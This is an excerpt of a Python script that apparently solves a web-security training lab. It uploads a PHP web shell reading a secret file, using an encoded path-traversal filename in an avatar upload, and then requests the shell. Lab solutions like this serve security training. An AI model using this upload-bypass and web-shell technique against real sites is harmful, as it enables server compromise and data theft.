...
LAB_URL = "https://0aee0099033eef038071da00006e00c5.web-security-academy.net"
...
def main():
    ...
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Uploading the shell file via path traversal.. ", end="", flush=True)
    
    shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""
    shell_file_name = "hack.php" # You can change this to what you want
    files = { "avatar": (f"%2e%2e%2f{shell_file_name}", shell_file, "application/x-php") }
    ...
    uploaded_shell = fetch(f"/files/{shell_file_name}", cookies)
